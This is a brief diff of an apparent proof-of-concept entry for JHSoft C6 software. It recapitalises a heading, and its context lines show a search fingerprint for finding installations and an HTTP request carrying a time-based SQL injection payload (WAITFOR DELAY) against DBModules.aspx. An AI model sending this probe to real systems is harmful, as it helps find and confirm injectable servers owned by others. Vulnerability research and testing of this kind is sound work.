@@ -8,7 +8,7 @@
 body="c6/Jhsoft.Web.login"
 ```
 
-## poc
+## POC
 
 ```java
 GET /C6/JHSoft.Web.WorkFlat/DBModules.aspx/?interfaceID=1;WAITFOR+DELAY+'0:0:5'-- HTTP/1.1
